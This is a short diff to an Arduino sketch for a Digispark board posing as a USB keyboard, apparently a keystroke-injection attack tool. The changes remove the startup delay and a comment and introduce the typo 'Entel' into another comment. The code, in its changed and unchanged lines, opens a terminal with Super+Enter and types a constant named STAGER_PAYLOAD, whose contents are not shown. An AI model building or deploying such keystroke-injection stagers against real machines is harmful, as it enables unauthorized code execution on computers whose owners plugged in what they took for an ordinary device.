@@ -7,7 +7,7 @@ void setup() {}
 
 void loop() {
     // Sleep
-    DigiKeyboard.delay(10000);
+    //DigiKeyboard.delay(10000);
 
     // Wait for OS to enumerate the USB device
     DigiKeyboard.delay(3000);
@@ -25,12 +25,11 @@ void loop() {
     DigiKeyboard.delay(1500);
 
     // ==========================================
-    // Attempt 2: Super + Enter
+    // Attempt 2: Super + Entel
     // ==========================================
     DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_GUI_LEFT);
     DigiKeyboard.delay(1000);
 
-    // Print the second message
     DigiKeyboard.println(STAGER_PAYLOAD);
     DigiKeyboard.delay(1500);
 
